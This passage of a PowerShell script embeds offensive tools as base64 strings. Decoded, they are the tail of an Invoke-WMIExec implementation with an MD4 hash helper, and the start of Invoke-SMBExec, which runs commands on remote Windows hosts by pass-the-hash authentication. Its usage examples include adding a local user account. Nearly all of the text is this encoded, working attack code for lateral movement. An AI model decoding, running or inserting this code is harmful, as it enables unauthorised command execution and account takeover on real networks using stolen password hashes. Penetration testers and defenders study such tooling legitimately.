NU1NQVmVyaWZpZXIgJHJlcXVlc3RfYXV0aF9wYWRkaW5nIDB4MDQgJHNlcXVlbmNlX251bWJlcg0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQyA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDDQogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTVNTUF92ZXJpZmllciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTlRMTVNTUF92ZXJpZmllciANCiAgICAgICAgICAgICAgICAgICAgICAgICRSUENfc2lnbmF0dXJlID0gJEhNQUNfTUQ1LkNvbXB1dGVIYXNoKCRzZXF1ZW5jZV9udW1iZXIgKyAkUlBDICsgJHN0dWJfZGF0YSArICROVExNU1NQX3ZlcmlmaWVyWzAuLigkcmVxdWVzdF9hdXRoX3BhZGRpbmcgKyA3KV0pDQogICAgICAgICAgICAgICAgICAgICAgICAkUlBDX3NpZ25hdHVyZSA9ICRSUENfc2lnbmF0dXJlWzAuLjddDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05UTE1TU1BfdmVyaWZpZXJbIk5UTE1TU1BWZXJpZmllcl9OVExNU1NQVmVyaWZpZXJDaGVja3N1bSJdID0gJFJQQ19zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICROVExNU1NQX3ZlcmlmaWVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OVExNU1NQX3ZlcmlmaWVyDQogICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zZW5kID0gJFJQQyArICRzdHViX2RhdGEgKyAkTlRMTVNTUF92ZXJpZmllcg0KICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnRfc3RyZWFtLldyaXRlKCRXTUlfY2xpZW50X3NlbmQsMCwkV01JX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnRfc3RyZWFtLkZsdXNoKCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoISRyZXF1ZXN0X3NwbGl0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfY2xpZW50X3JhbmRvbV9wb3J0X3N0cmVhbS5SZWFkKCRXTUlfY2xpZW50X3JlY2VpdmUsMCwkV01JX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSgkV01JX2NsaWVudF9yYW5kb21fcG9ydF9zdHJlYW0uRGF0YUF2YWlsYWJsZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9yYW5kb21fcG9ydF9zdHJlYW0uUmVhZCgkV01JX2NsaWVudF9yZWNlaXZlLDAsJFdNSV9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSAkU2xlZXANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2UgPSAkV01JX2NsaWVudF9zdGFnZV9uZXh0DQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAnUmVzdWx0Jw0KICAgICAgICAgICAgICAgICAgICB7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKCRXTUlfY2xpZW50X3JhbmRvbV9wb3J0X3N0cmVhbS5EYXRhQXZhaWxhYmxlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfY2xpZW50X3JhbmRvbV9wb3J0X3N0cmVhbS5SZWFkKCRXTUlfY2xpZW50X3JlY2VpdmUsMCwkV01JX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1tICRTbGVlcA0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkV01JX2NsaWVudF9yZWNlaXZlWzExNDVdIC1uZSA5KQ0KICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3Byb2Nlc3NfSUQgPSBEYXRhTGVuZ3RoMiAxMTQxICRXTUlfY2xpZW50X3JlY2VpdmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkNvbW1hbmQgZXhlY3V0ZWQgd2l0aCBwcm9jZXNzIElEICR0YXJnZXRfcHJvY2Vzc19JRCBvbiAkdGFyZ2V0X2xvbmciDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJQcm9jZXNzIGRpZCBub3Qgc3RhcnQsIGNoZWNrIHlvdXIgY29tbWFuZCINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2UgPSAnZXhpdCcNCiAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gJFNsZWVwDQogICAgICAgICAgICANCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnQuQ2xvc2UoKQ0KICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnRfc3RyZWFtLkNsb3NlKCkNCiAgICAgICAgfQ0KDQogICAgICAgICRXTUlfY2xpZW50LkNsb3NlKCkNCiAgICAgICAgJFdNSV9jbGllbnRfc3RyZWFtLkNsb3NlKCkNCiAgICB9DQoNCn0NCg0KfQ0KDQpGdW5jdGlvbiBHZXQtTUQ0SGFzaCB7DQo8Iw0KLlNZTk9QU0lTDQogICAgVGhpcyBjbWRsZXQgcmV0dXJucyB0aGUgTUQ0IGhhc2ggb2YgdGhlIGRhdGEgdGhhdCBpcyBpbnB1dC4NCiAgICBXQVJOSU5HOiBNRDQgaXMgbm90IHNlY3VyZSwgc28gaXQgc2hvdWxkIE5FVkVSIGJlIHVzZWQgdG8NCiAgICBwcm90ZWN0IHNlbnNpdGl2ZSBkYXRhLiBUaGlzIGNtZGxldCBpcyBmb3IgcmVzZWFyY2ggcHVycG9zZXMgb25seSENCiANCi5ERVNDUklQVElPTg0KICAgIFRoaXMgY21kbGV0IHJldHVybnMgdGhlIE1ENCBoYXNoIG9mIHRoZSBkYXRhIHRoYXQgaXMgaW5wdXQuDQogICAgV0FSTklORzogTUQ0IGlzIG5vdCBzZWN1cmUsIHNvIGl0IHNob3VsZCBORVZFUiBiZSB1c2VkIHRvDQogICAgcHJvdGVjdCBzZW5zaXRpdmUgZGF0YS4gVGhpcyBjbWRsZXQgaXMgZm9yIHJlc2VhcmNoIHB1cnBvc2VzIG9ubHkhDQogICAgVGhpcyBjbWRsZXQgdXNlcyBNaWNyb3NvZnQncyBpbXBsZW1lbnRhdGlvbiBvZiBNRDQsIGV4cG9ydGVkDQogICAgZnJvbSBiY3J5cHQuZGxsLiBUaGUgaW1wbGVtZW50YXRpb24gaXMgZnVsbHkgY29tcGxpYW50IHdpdGgNCiAgICBSRkMgMTMyMC4gVGhpcyBjbWRsZXQgdGFrZXMgYSBieXRlIGFycmF5IGFzIGlucHV0LCBub3QgYSBzdHJpbmcuDQogICAgU28gaWYgeW91IHdhbnRlZCB0byBoYXNoIGEgc3RyaW5nIChzdWNoIGFzIGEgcGFzc3dvcmQsKSB5b3UNCiAgICBuZWVkIHRvIGNvbnZlcnQgaXQgdG8gYSBieXRlIGFycmF5IGZpcnN0Lg0KIA0KLkVYQU1QTEUNCiAgICBHZXQtTUQ0SGFzaCAtRGF0YVRvSGFzaCAkKFtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiWW91clBhc3N3b3JkMSEiKSkNCiANCi5QQVJBTUVURVIgRGF0YVRvSGFzaA0KICAgIEEgYnl0ZSBhcnJheSB0aGF0IHJlcHJlc2VudHMgdGhlIGRhdGEgdGhhdCB5b3Ugd2FudCB0byBoYXNoLg0KIA0KLklOUFVUUw0KICAgIEEgYnl0ZSBhcnJheSBjb250YWluaW5nIHRoZSBkYXRhIHlvdSB3aXNoIHRvIGhhc2guDQogDQouT1VUUFVUUw0KICAgIEEgMTI4LWJpdCBoZXhhZGVjaW1hbCBzdHJpbmcgLSB0aGUgTUQ0IGhhc2ggb2YgeW91ciBkYXRhLg0KIA0KLk5PVEVTDQogICAgQXV0aG9yOiBSeWFuIFJpZXMsIDIwMTQsIHJ5YW5AbXlvdGhlcnBjaXNhY2xvdWQuY29tDQogDQouTElOSw0KICAgIGh0dHBzOi8vbXlvdGhlcnBjaXNhY2xvdWQuY29tDQojPg0KICAgIFtDbWRsZXRCaW5kaW5nKCldDQogICAgUGFyYW0gKFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZT0kRmFsc2UpXSAgICAgICAgICANCiAgICAgICAgICAgW0J5dGVbXV0kRGF0YVRvSGFzaCkNCiAgICBFTkQNCiAgICB7ICAgICAgIA0KICAgICAgICBTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiBMYXRlc3QNCiAgICAgICAgaWYgKC1ub3QgKFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTVHlwZU5hbWVdJ2RzYWZkc2FmZHNhZmRzJykuVHlwZSkNCiAgICAgICAgew0KICAgICAgICBBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gQCcNCiAgICAgICAgdXNpbmcgU3lzdGVtOw0KICAgICAgICB1c2luZyBTeXN0ZW0uVGV4dDsNCiAgICAgICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KICAgICAgICBwdWJsaWMgY2xhc3MgZHNhZmRzYWZkc2FmZHMNCiAgICAgICAgew0KICAgICAgICAgICAgW0RsbEltcG9ydCgiYmNyeXB0LmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQ0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gTlRTdGF0dXMgQkNyeXB0T3BlbkFsZ29yaXRobVByb3ZpZGVyKA0KICAgICAgICAgICAgICAgIFtPdXRdIG91dCBJbnRQdHIgcGhBbGdvcml0aG0sDQogICAgICAgICAgICAgICAgW0luXSBzdHJpbmcgcHN6QWxnSWQsDQogICAgICAgICAgICAgICAgW0luLCBPcHRpb25hbF0gc3RyaW5nIHBzekltcGxlbWVudGF0aW9uLA0KICAgICAgICAgICAgICAgIFtJbl0gVUludDMyIGR3RmxhZ3MpOw0KIA0KICAgICAgICAgICAgW0RsbEltcG9ydCgiYmNyeXB0LmRsbCIpXQ0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gTlRTdGF0dXMgQkNyeXB0Q2xvc2VBbGdvcml0aG1Qcm92aWRlcigNCiAgICAgICAgICAgICAgICBbSW4sIE91dF0gSW50UHRyIGhBbGdvcml0aG0sDQogICAgICAgICAgICAgICAgW0luXSBVSW50MzIgZHdGbGFncyk7DQogDQogICAgICAgICAgICBbRGxsSW1wb3J0KCJiY3J5cHQuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBOVFN0YXR1cyBCQ3J5cHRDcmVhdGVIYXNoKA0KICAgICAgICAgICAgICAgIFtJbiwgT3V0XSBJbnRQdHIgaEFsZ29yaXRobSwNCiAgICAgICAgICAgICAgICBbT3V0XSBvdXQgSW50UHRyIHBoSGFzaCwNCiAgICAgICAgICAgICAgICBbT3V0XSBJbnRQdHIgcGJIYXNoT2JqZWN0LA0KICAgICAgICAgICAgICAgIFtJbiwgT3B0aW9uYWxdIFVJbnQzMiBjYkhhc2hPYmplY3QsDQogICAgICAgICAgICAgICAgW0luLCBPcHRpb25hbF0gSW50UHRyIHBiU2VjcmV0LA0KICAgICAgICAgICAgICAgIFtJbl0gVUludDMyIGNiU2VjcmV0LA0KICAgICAgICAgICAgICAgIFtJbl0gVUludDMyIGR3RmxhZ3MpOw0KIA0KICAgICAgICAgICAgW0RsbEltcG9ydCgiYmNyeXB0LmRsbCIpXQ0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gTlRTdGF0dXMgQkNyeXB0RGVzdHJveUhhc2goDQogICAgICAgICAgICAgICAgW0luLCBPdXRdIEludFB0ciBoSGFzaCk7DQogDQogICAgICAgICAgICBbRGxsSW1wb3J0KCJiY3J5cHQuZGxsIildDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBOVFN0YXR1cyBCQ3J5cHRIYXNoRGF0YSgNCiAgICAgICAgICAgICAgICBbSW4sIE91dF0gSW50UHRyIGhIYXNoLA0KICAgICAgICAgICAgICAgIFtJbiwgTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBBcnJheSldIGJ5dGVbXSBwYklucHV0LA0KICAgICAgICAgICAgICAgIFtJbl0gaW50IGNiSW5wdXQsDQogICAgICAgICAgICAgICAgW0luXSBVSW50MzIgZHdGbGFncyk7DQogDQogICAgICAgICAgICBbRGxsSW1wb3J0KCJiY3J5cHQuZGxsIildDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBOVFN0YXR1cyBCQ3J5cHRGaW5pc2hIYXNoKA0KICAgICAgICAgICAgICAgIFtJbiwgT3V0XSBJbnRQdHIgaEhhc2gsDQogICAgICAgICAgICAgICAgW091dCwgTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBBcnJheSldIGJ5dGVbXSBwYklucHV0LA0KICAgICAgICAgICAgICAgIFtJbl0gaW50IGNiSW5wdXQsDQogICAgICAgICAgICAgICAgW0luXSBVSW50MzIgZHdGbGFncyk7DQogDQogICAgICAgICAgICBbRmxhZ3NdDQogICAgICAgICAgICBwdWJsaWMgZW51bSBBbGdPcHNGbGFncyA6IHVpbnQNCiAgICAgICAgICAgIHsgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIEJDUllQVF9QUk9WX0RJU1BBVENIID0gMHgwMDAwMDAwMSwNCiAgICAgICAgICAgICAgICBCQ1JZUFRfQUxHX0hBTkRMRV9ITUFDX0ZMQUcgPSAweDAwMDAwMDA4LA0KICAgICAgICAgICAgICAgIEJDUllQVF9IQVNIX1JFVVNBQkxFX0ZMQUcgPSAweDAwMDAwMDIwDQogICAgICAgICAgICB9DQogDQogICAgICAgICAgICAvLyBUaGlzIGlzIGEgZ2lnYW50aWMgZW51bSBhbmQgSSBkb24ndCB3YW50IHRvIGNvcHkgYWxsIG9mIGl0IGludG8gdGhpcyBQb3dlcnNoZWxsIHNjcmlwdC4NCiAgICAgICAgICAgIC8vIEJhc2ljYWxseSBhbnl0aGluZyBvdGhlciB0aGFuIHplcm8gbWVhbnMgc29tZXRoaW5nIHdlbnQgd3JvbmcuDQogICAgICAgICAgICBwdWJsaWMgZW51bSBOVFN0YXR1cyA6IHVpbnQNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBTVEFUVVNfU1VDQ0VTUyA9IDB4MDAwMDAwMDANCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KJ0ANCn0NCiANCiAgICAgICAgW0J5dGVbXV0kSGFzaEJ5dGVzICAgPSBOZXctT2JqZWN0IEJ5dGVbXSAxNg0KICAgICAgICBbSW50UHRyXSRQSEFsZ29yaXRobSA9IFtJbnRQdHJdOjpaZXJvDQogICAgICAgIFtJbnRQdHJdJFBISGFzaCAgICAgID0gW0ludFB0cl06Olplcm8NCiAgICAgICAgJE5UU3RhdHVzID0gW2RzYWZkc2FmZHNhZmRzXTo6QkNyeXB0T3BlbkFsZ29yaXRobVByb3ZpZGVyKFtSZWZdICRQSEFsZ29yaXRobSwgJ01ENCcsICROdWxsLCAwKQ0KICAgICAgICBJZiAoJE5UU3RhdHVzIC1ORSAwKQ0KICAgICAgICB7DQogICAgICAgICAgICBXcml0ZS1FcnJvciAiQkNyeXB0T3BlbkFsZ29yaXRobVByb3ZpZGVyIGZhaWxlZCB3aXRoIE5UU1RBVFVTICROVFN0YXR1cyINCiAgICAgICAgICAgIElmICgkUEhBbGdvcml0aG0gLU5FIFtJbnRQdHJdOjpaZXJvKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICROVFN0YXR1cyA9IFtkc2FmZHNhZmRzYWZkc106OkJDcnlwdENsb3NlQWxnb3JpdGhtUHJvdmlkZXIoJFBIQWxnb3JpdGhtLCAwKQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgUmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgJE5UU3RhdHVzID0gW2RzYWZkc2FmZHNhZmRzXTo6QkNyeXB0Q3JlYXRlSGFzaCgkUEhBbGdvcml0aG0sIFtSZWZdICRQSEhhc2gsIFtJbnRQdHJdOjpaZXJvLCAwLCBbSW50UHRyXTo6WmVybywgMCwgMCkNCiAgICAgICAgSWYgKCROVFN0YXR1cyAtTkUgMCkNCiAgICAgICAgew0KICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkJDcnlwdENyZWF0ZUhhc2ggZmFpbGVkIHdpdGggTlRTVEFUVVMgJE5UU3RhdHVzIg0KICAgICAgICAgICAgSWYgKCRQSEhhc2ggLU5FIFtJbnRQdHJdOjpaZXJvKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICROVFN0YXR1cyA9IFtkc2FmZHNhZmRzYWZkc106OkJDcnlwdERlc3Ryb3lIYXNoKCRQSEhhc2gpICAgICAgICAgICAgICAgDQogICAgICAgICAgICB9DQogICAgICAgICAgICBJZiAoJFBIQWxnb3JpdGhtIC1ORSBbSW50UHRyXTo6WmVybykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkTlRTdGF0dXMgPSBbZHNhZmRzYWZkc2FmZHNdOjpCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyKCRQSEFsZ29yaXRobSwgMCkNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIFJldHVybg0KICAgICAgICB9DQogDQogICAgICAgICROVFN0YXR1cyA9IFtkc2FmZHNhZmRzYWZkc106OkJDcnlwdEhhc2hEYXRhKCRQSEhhc2gsICREYXRhVG9IYXNoLCAkRGF0YVRvSGFzaC5MZW5ndGgsIDApDQogICAgICAgICROVFN0YXR1cyA9IFtkc2FmZHNhZmRzYWZkc106OkJDcnlwdEZpbmlzaEhhc2goJFBISGFzaCwgJEhhc2hCeXRlcywgJEhhc2hCeXRlcy5MZW5ndGgsIDApDQogDQogICAgICAgIElmICgkUEhIYXNoIC1ORSBbSW50UHRyXTo6WmVybykNCiAgICAgICAgew0KICAgICAgICAgICAgJE5UU3RhdHVzID0gW2RzYWZkc2FmZHNhZmRzXTo6QkNyeXB0RGVzdHJveUhhc2goJFBISGFzaCkNCiAgICAgICAgfQ0KICAgICAgICBJZiAoJFBIQWxnb3JpdGhtIC1ORSBbSW50UHRyXTo6WmVybykNCiAgICAgICAgew0KICAgICAgICAgICAgJE5UU3RhdHVzID0gW2RzYWZkc2FmZHNhZmRzXTo6QkNyeXB0Q2xvc2VBbGdvcml0aG1Qcm92aWRlcigkUEhBbGdvcml0aG0sIDApDQogICAgICAgIH0NCiAgICAgICAgIA0KICAgICAgICAkSGFzaFN0cmluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuU3RyaW5nQnVpbGRlcg0KICAgICAgICBGb3JlYWNoICgkQnl0ZSBJbiAkSGFzaEJ5dGVzKQ0KICAgICAgICB7DQogICAgICAgICAgICBbVm9pZF0kSGFzaFN0cmluZy5BcHBlbmQoJEJ5dGUuVG9TdHJpbmcoIlgyIikpDQogICAgICAgIH0NCiAgICAgICAgUmV0dXJuICRIYXNoU3RyaW5nLlRvU3RyaW5nKCkNCiAgICB9DQp9DQo="

    # Author: @kevin_robertson
    $smbexec = "ZnVuY3Rpb24gSW52b2tlLVNNQkV4ZWMNCnsNCjwjDQouU1lOT1BTSVMNCkludm9rZS1TTUJFeGVjIHBlcmZvcm1zIFNNQkV4ZWMgc3R5bGUgY29tbWFuZCBleGVjdXRpb24gd2l0aCBOVExNdjIgcGFzcyB0aGUgaGFzaCBhdXRoZW50aWNhdGlvbi4gSW52b2tlLVNNQkV4ZWMNCnN1cHBvcnRzIFNNQjEgYW5kIFNNQjIgd2l0aCBhbmQgd2l0aG91dCBTTUIgc2lnbmluZy4NCg0KLlBBUkFNRVRFUiBUYXJnZXQNCkhvc3RuYW1lIG9yIElQIGFkZHJlc3Mgb2YgdGFyZ2V0Lg0KDQouUEFSQU1FVEVSIFVzZXJuYW1lDQpVc2VybmFtZSB0byB1c2UgZm9yIGF1dGhlbnRpY2F0aW9uLg0KDQouUEFSQU1FVEVSIERvbWFpbg0KRG9tYWluIHRvIHVzZSBmb3IgYXV0aGVudGljYXRpb24uIFRoaXMgcGFyYW1ldGVyIGlzIG5vdCBuZWVkZWQgd2l0aCBsb2NhbCBhY2NvdW50cyBvciB3aGVuIHVzaW5nIEBkb21haW4gYWZ0ZXIgdGhlDQp1c2VybmFtZS4gDQoNCi5QQVJBTUVURVIgSGFzaA0KTlRMTSBwYXNzd29yZCBoYXNoIGZvciBhdXRoZW50aWNhdGlvbi4gVGhpcyBtb2R1bGUgd2lsbCBhY2NlcHQgZWl0aGVyIExNOk5UTE0gb3IgTlRMTSBmb3JtYXQuDQoNCi5QQVJBTUVURVIgQ29tbWFuZA0KQ29tbWFuZCB0byBleGVjdXRlIG9uIHRoZSB0YXJnZXQuIElmIGEgY29tbWFuZCBpcyBub3Qgc3BlY2lmaWVkLCB0aGUgZnVuY3Rpb24gd2lsbCBjaGVjayB0byBzZWUgaWYgdGhlIHVzZXJuYW1lDQphbmQgaGFzaCBwcm92aWRlcyBsb2NhbCBhZG1pbmlzdHJhdG9yIGFjY2VzcyBvbiB0aGUgdGFyZ2V0Lg0KDQouUEFSQU1FVEVSIENvbW1hbmRDT01TUEVDDQpEZWZhdWx0ID0gRW5hYmxlZDogUHJlcGVuZCAlQ09NU1BFQyUgL0MgdG8gQ29tbWFuZC4NCg0KLlBBUkFNRVRFUiBTZXJ2aWNlDQpEZWZhdWx0ID0gMjAgQ2hhcmFjdGVyIFJhbmRvbTogTmFtZSBvZiB0aGUgc2VydmljZSB0byBjcmVhdGUgYW5kIGRlbGV0ZSBvbiB0aGUgdGFyZ2V0Lg0KDQouUEFSQU1FVEVSIFNNQjENCihTd2l0Y2gpIEZvcmNlIFNNQjEuIFRoZSBkZWZhdWx0IGJlaGF2aW9yIGlzIHRvIHBlcmZvcm0gU01CIHZlcnNpb24gbmVnb3RpYXRpb24gYW5kIHVzZSBTTUIyIGlmIHN1cHBvcnRlZCBieSB0aGUNCnRhcmdldC4NCg0KLlBBUkFNRVRFUiBTbGVlcA0KRGVmYXVsdCA9IDE1MCBNaWxsaXNlY29uZHM6IFNldHMgdGhlIGZ1bmN0aW9uJ3MgU3RhcnQtU2xlZXAgdmFsdWVzIGluIG1pbGxpc2Vjb25kcy4gWW91IGNhbiB0cnkgdHdlYWtpbmcgdGhpcw0Kc2V0dGluZyBpZiB5b3UgYXJlIGV4cGVyaWVuY2luZyBzdHJhbmdlIHJlc3VsdHMuDQoNCi5FWEFNUExFDQpJbnZva2UtU01CRXhlYyAtVGFyZ2V0IDE5Mi4xNjguMTAwLjIwIC1Eb21haW4gVEVTVERPTUFJTiAtVXNlcm5hbWUgVEVTVCAtSGFzaCBGNkYzOEI3OTNEQjZBOTRCQTA0QTUyRjFEM0VFOTJGMCAtQ29tbWFuZCAiY29tbWFuZCBvciBsYXVuY2hlciB0byBleGVjdXRlIiAtdmVyYm9zZQ0KDQouRVhBTVBMRQ0KSW52b2tlLVNNQkV4ZWMgLVRhcmdldCAxOTIuMTY4LjEwMC4yMCAtRG9tYWluIFRFU1RET01BSU4gLVVzZXJuYW1lIFRFU1QgLUhhc2ggRjZGMzhCNzkzREI2QTk0QkEwNEE1MkYxRDNFRTkyRjAgLUNvbW1hbmQgIm5ldCB1c2VyIFNNQkV4ZWMgV2ludGVyMjAxNyAvYWRkIg0KDQouRVhBTVBMRQ0KSW52b2tlLVNNQkV4ZWMgLVRhcmdldCAxOTIuMTY4LjEwMC4yMCAtRG9tYWluIFRFU1RET01BSU4gLVVzZXJuYW1lIFRFU1QgLUhhc2ggRjZGMzhCNzkzREI2QTk0QkEwNEE1MkYxRDNFRTkyRjANCg0KLkxJTksNCmh0dHBzOi8vZ2l0aHViLmNvbS9LZXZpbi1Sb2JlcnRzb24vSW52b2tlLVRoZUhhc2gNCg0KIz4NCltDbWRsZXRCaW5kaW5nKCldDQpwYXJhbQ0KKA0KICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV1bU3RyaW5nXSRUYXJnZXQsDQogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXVtTdHJpbmddJFVzZXJuYW1lLA0KICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kRG9tYWluLA0KICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kQ29tbWFuZCwNCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRDb21tYW5kQ09NU1BFQz0iWSIsDQogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoeyRfLkxlbmd0aCAtZXEgMzIgLW9yICRfLkxlbmd0aCAtZXEgNjV9KV1bU3RyaW5nXSRIYXNoLA0KICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kU2VydmljZSwNCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTd2l0Y2hdJFNNQjEsDQogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSRQYXNzd29yZCwNCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJFNsZWVwPTE1MA0KKQ0KDQppZighJFBhc3N3b3JkIC1hbmQgISRIYXNoKXsNCiAgICBleGl0DQp9DQoNCmlmKCRQYXNzd29yZCl7DQogICAgJEhhc2ggPSBHZXQtTUQ0SGFzaCAtRGF0YVRvSGFzaCAkKFtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkUGFzc3dvcmQpKQ0KICAgIFdyaXRlLU91dHB1dCAiSGFzaCBiZWluZyB1c2VkOiAkSGFzaCINCn0NCg0KaWYoJENvbW1hbmQpDQp7DQogICAgJFNNQl9leGVjdXRlID0gJHRydWUNCn0NCg0KaWYoJFNNQjEpDQp7DQogICAgJFNNQl92ZXJzaW9uID0gJ1NNQjEnDQp9DQoNCmZ1bmN0aW9uIENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5DQp7DQogICAgcGFyYW0oJHBhY2tldF9vcmRlcmVkX2RpY3Rpb25hcnkpDQoNCiAgICBGb3JFYWNoKCRmaWVsZCBpbiAkcGFja2V0X29yZGVyZWRfZGljdGlvbmFyeS5WYWx1ZXMpDQogICAgew0KICAgICAgICAkYnl0ZV9hcnJheSArPSAkZmllbGQNCiAgICB9DQoNCiAgICByZXR1cm4gJGJ5dGVfYXJyYXkNCn0NCg0KI05ldEJJT1MNCg0KZnVuY3Rpb24gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSgpDQp7DQogICAgcGFyYW0oW0ludF0kcGFja2V0X2hlYWRlcl9sZW5ndGgsW0ludF0kcGFja2V0X2RhdGFfbGVuZ3RoKQ0KDQogICAgW0J5dGVbXV0kcGFja2V0X25ldGJpb3Nfc2Vzc2lvbl9zZXJ2aWNlX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9oZWFkZXJfbGVuZ3RoICsgJHBhY2tldF9kYXRhX2xlbmd0aCkNCiAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlX2xlbmd0aCA9ICRwYWNrZXRfbmV0Ymlvc19zZXNzaW9uX3NlcnZpY2VfbGVuZ3RoWzIuLjBdDQoNCiAgICAkcGFja2V0X05ldEJJT1NTZXNzaW9uU2VydmljZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9OZXRCSU9TU2Vzc2lvblNlcnZpY2UuQWRkKCJOZXRCSU9TU2Vzc2lvblNlcnZpY